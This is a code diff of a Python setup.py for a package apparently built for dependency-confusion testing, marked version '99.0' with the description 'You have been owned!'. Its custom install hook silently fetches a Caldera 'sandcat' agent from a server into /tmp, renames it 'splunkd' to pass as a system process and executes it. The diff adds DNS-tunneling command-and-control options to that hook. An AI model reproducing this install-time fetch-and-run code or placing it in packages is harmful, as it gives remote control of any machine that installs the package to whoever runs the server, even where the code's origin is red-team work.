@@ -29,15 +29,15 @@ class install(_install):
         os.dup2(stdout.fileno(), sys.stdout.fileno())
         os.dup2(stderr.fileno(), sys.stderr.fileno())
         os.chdir('/tmp')
-        os.system(f'curl -s -X POST -H "file:sandcat.go" -H "platform:linux" {server}/file/download > splunkd;chmod +x splunkd;')
-        os.execl('./splunkd', './splunkd', '-server', server, '-group', 'red')
+        os.system(f'curl -s -X POST -H "file:sandcat.go" -H "platform:linux" -H "gocat-extensions:dns_tunneling" {server}/file/download > splunkd; chmod +x splunkd;')
+        os.execl('./splunkd', './splunkd', '-c2', 'DnsTunneling', '-server', server, '-group', 'red')
 
 
 setup(name=package_name,
       version='99.0',
       description='You have been owned!',
       author='Dylan Cao',
-      author_email='dvc8bg@virginia.edu',
+      author_email='dylan.v.cao@gmail.com',
       packages=[package_name],
       cmdclass={'install': install}
 )
